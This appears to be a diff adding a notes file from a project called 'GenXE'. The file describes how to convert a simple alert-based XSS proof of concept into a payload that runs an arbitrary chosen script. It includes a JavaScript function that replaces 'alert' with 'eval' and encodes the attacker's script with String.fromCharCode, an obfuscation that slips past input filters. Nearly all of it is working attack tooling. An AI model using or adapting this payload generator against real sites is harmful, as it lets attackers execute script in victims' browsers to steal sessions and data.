@@ -1,0 +1,64 @@
+id:SxeToDxe_HOW
+
+[content]
+How to realize:
+"Simple Xss Exploit" --> "Desired Xss Exploit"
+
+[exp]
+(+)the file GenXE_GOAL:
+-------------[START]
+a simple XSS exploit popping up an "alert" messagbox with the following text:
+	GenXEa(GenXEm,GenXEm)GenXEa ............(TYPEA)
+-------------[END]
+
+(+)definition:
+-------------[START]
+"alert" function is called "SxeFunction";
+"GenXE" string in the exploit code is called "SxeAnchor";
+simple xss exploit is called "Sxe";
+desired xss exploit is called "Dxe";
+desired script is called "Ds";
+-------------[END]
+
+for TYPEA Sxe
+=============
+transform something like:
+javascript:alert("GenXEa(GenXEm,GenXEm)GenXEa")
+to
+javascript:eval("eval(String.fromCharCode(123,123,123,123))")
+
+(+)JAVASCRIPT for TYPEA
+-------------[START]
+function SxeToDxe(Sxe,Ds)
+	{
+		//refer to the file "SxeToDxe_HOW" of "SxeToDxe" task of "GenXE" project.
+		
+		SxeAnchor="genxe";	
+		SxeFunction="alert";
+
+		IndexA1=Sxe.indexOf(SxeAnchor+"a");
+		IndexM1=Sxe.indexOf(SxeAnchor+"m",IndexA1);
+		IndexM2=Sxe.indexOf(SxeAnchor+"m",IndexM1+1);
+		IndexA2=Sxe.indexOf(SxeAnchor+"a",IndexM2);
+		LeftBracket =Sxe.substring(IndexA1+(SxeAnchor+"a").length,IndexM1);
+		RightBracket=Sxe.substring(IndexM2+(SxeAnchor+"a").length,IndexA2);
+		Comma       =Sxe.substring(IndexM1+(SxeAnchor+"m").length,IndexM2);
+
+		DxePrefix =Sxe.substring(0,IndexA1);
+		//replace SxeFunction with "eval"
+		Index1=DxePrefix.lastIndexOf(SxeFunction);
+		Index2=Index1+SxeFunction.length;
+		DxePrefix=DxePrefix.substring(0,Index1)+"eval"+DxePrefix.substring(Index2,DxePrefix.length);
+
+		DxePostfix=Sxe.substring(IndexA2+(SxeAnchor+"m").length,Sxe.length);
+
+		EncodedDxe="eval"+LeftBracket+"String.fromCharCode"+LeftBracket;
+		for(i=0;i<=(Ds.length-1)-1;i++)
+		EncodedDxe=EncodedDxe+Ds.charCodeAt(i)+Comma;
+		EncodedDxe=EncodedDxe+Ds.charCodeAt(Ds.length-1);
+		EncodedDxe=EncodedDxe+RightBracket+RightBracket;
+
+		Dxe=DxePrefix+EncodedDxe+DxePostfix;
+		return Dxe;
+	}
+-------------[END]
